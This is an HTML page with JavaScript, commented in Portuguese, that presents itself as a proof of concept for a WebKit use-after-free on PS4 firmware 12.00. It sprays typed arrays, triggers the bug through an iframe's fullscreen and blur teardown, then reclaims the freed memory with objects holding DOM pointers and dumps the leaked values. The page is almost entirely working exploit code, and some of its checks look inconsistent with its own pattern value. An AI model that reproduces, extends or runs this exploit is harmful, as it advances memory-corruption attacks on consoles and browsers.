<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - Parent Reclamation Leak</title>
    <style>
        body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
        button { padding: 12px; font-weight: bold; cursor: pointer; margin-right: 10px; border-radius: 5px; }
        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #444; height: 400px; overflow-y: scroll; display: none; margin-top: 20px; line-height: 1.5;}
        .highlight { color: #fff; background-color: #d32f2f; padding: 2px; }
    </style>
</head>
<body>

    <h2>PS4 12.00 - Parent Reclamation (Bypass de Zeros)</h2>
    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando...</span></p>

    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Preparar Pai (10 Offsets)</button>
    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (O seu Iframe)</button>
    <button onclick="reclaimAndVerify()" style="background: #4caf50; color: #fff;">3. Sujar RAM (Pai) + Memory Dump</button>

    <div id="log-area"></div>
    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; 
        let controllers = [];
        const statusEl = document.getElementById('status');
        const logArea = document.getElementById('log-area');

        // ==========================================
        // PASSO 1: A BASE DE SUCESSO
        // ==========================================
        function prepareMemory() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(10); // 80 bytes
                arr[0] = i;
                controllers.push(arr);
            }
            statusEl.innerText = "5000 Objetos Prontos na página pai.";
        }

        // ==========================================
        // PASSO 2: O SEU GATILHO INTOCÁVEL
        // ==========================================
        function injectTrigger() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:2px dashed red;"></iframe>';
            const fDoc = document.getElementById('pocFrame').contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html><body style="background:#fff; text-align:center;">
                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">START FS + OPTIONS</button>
                    <script>
                        function startPoC() {
                            document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                let spray = [];
                                // O spray dentro do Iframe serve APENAS para causar o UAF
                                for (let i = 0; i < 8000; i++) {
                                    spray.push(new Float64Array(10).fill(${PATTERN}));
                                }

                                // O Teardown - Ele mata o iframe e zera a memória
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h2 style="color:green;">FINALIZADO (Memória Zerada pelo OS)</h2>');
                                    document.close();
                                }, 1000);
                            };
                        }
                    <\/script>
                </body></html>
            `);
            fDoc.close();
            statusEl.innerText = "Iframe Pronto. Sequência original: FS -> OPTIONS.";
        }

        // Classe criada na página Pai para substituir os zeros
        function ReclaimObject(i) {
            this.ptr1 = document;   // Coloca ponteiros reais do DOM na RAM
            this.ptr2 = window;
            this.ptr3 = navigator;
            this.fill1 = 0x414141;
            this.fill2 = 0x424242;
            this.id = i;
        }

        // ==========================================
        // PASSO 3: A RETOMADA (O SEGREDO!)
        // ==========================================
        function reclaimAndVerify() {
            statusEl.innerHTML = "<span style='color:orange;'>Sujando a memória zerada a partir do Pai...</span>";
            
            // 1. RECLAMATION SPRAY: A página pai escreve em cima dos zeros do Iframe
            window.parent_spray = [];
            for(let i = 0; i < 25000; i++) {
                // Instanciamos objetos vivos na página Pai, forçando o WebKit a preencher os buracos
                window.parent_spray.push(new ReclaimObject(i));
                
                // Intercalamos com Arrays de Objetos para garantir a presença de 'Butterflies'
                window.parent_spray.push([document, window, navigator]);
            }

            // 2. VERIFICAÇÃO DE CORRUPÇÃO
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                // A corrupção agora será detectada por QUALQUER MUDANÇA (não apenas o PATTERN)
                // Se o ReclaimObject caiu em cima do array, o valor vai mudar!
                if (controllers[i][0] !== i) { 
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            logArea.style.display = "block";
            logArea.innerHTML = "<b>[ DUMP DA MEMÓRIA RECONSTRUÍDA ]</b><br><br>";

            if (corrupted) {
                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ SUCESSO ABSOLUTO! ID: " + corruptedIndex + "</span>";
                logArea.innerHTML += "Memória recuperada após o teardown:<br><br>";
                
                let foundPointer = false;

                for(let i = 0; i < 10; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hexStr = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    let label = "";
                    let isPtr = false;

                    // Se encontrou o padrão, o UAF sobreviveu mas o Reclaim não sobrescreveu este offset
                    if (hexStr.includes("41414141")) {
                        label = " (Resquício do Iframe)";
                    } 
                    // Se não for zero e não for o padrão, É UM PONTEIRO DA PÁGINA PAI!
                    else if (hexStr !== "0000000000000000") {
                        label = " (PONTEIRO DO SISTEMA!)";
                        isPtr = true;
                        foundPointer = true;
                    } else {
                        label = " (Zero Fill)";
                    }
                    
                    let css = isPtr ? "class='highlight'" : "";
                    logArea.innerHTML += "Offset [" + i + "]: <span " + css + ">0x" + hexStr + "</span>" + label + "<br>";
                }

                if(foundPointer) {
                    logArea.innerHTML += "<br><b style='color:yellow;'>Você substituiu os zeros por dados reais! Bypass do OS concluído!</b>";
                }
            } else {
                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Nenhuma corrupção.</span>";
                logArea.innerHTML += "O GC agiu antes da retomada. Tente novamente.";
            }
        }
    </script>
</body>
</html>
